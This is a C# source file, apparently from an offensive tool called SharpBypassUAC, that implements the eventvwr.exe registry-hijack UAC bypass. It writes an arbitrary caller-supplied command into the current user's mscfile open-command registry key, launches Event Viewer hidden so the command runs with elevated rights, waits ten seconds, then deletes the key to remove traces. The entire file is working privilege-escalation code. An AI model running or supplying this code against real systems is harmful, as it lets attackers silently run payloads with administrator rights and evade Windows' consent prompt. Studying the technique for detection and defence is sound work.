using System;
using System.Threading;
using System.Diagnostics;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Microsoft.Win32;


namespace SharpBypassUAC
{
    public class EventVwr
    {
        public EventVwr(byte[] encodedCommand)
        {
            //Credit: https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/

            //Check if UAC is set to 'Always Notify'
            AlwaysNotify alwaysnotify = new AlwaysNotify();

            //Convert encoded command to a string
            string command = Encoding.UTF8.GetString(encodedCommand);

            //Set the registry key for eventvwr
            RegistryKey newkey = Registry.CurrentUser.OpenSubKey(@"Software\Classes\", true);
            newkey.CreateSubKey(@"mscfile\Shell\Open\command");

            RegistryKey vwr = Registry.CurrentUser.OpenSubKey(@"Software\Classes\mscfile\Shell\Open\command", true);
            vwr.SetValue("", @command);
            vwr.Close();

            //start fodhelper
            Process p = new Process();
            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            p.StartInfo.FileName = "C:\\windows\\system32\\eventvwr.exe";
            p.Start();

            //sleep 10 seconds to let the payload execute
            Thread.Sleep(10000);

            //Unset the registry
            newkey.DeleteSubKeyTree("mscfile");
            return;

        }
    }
}
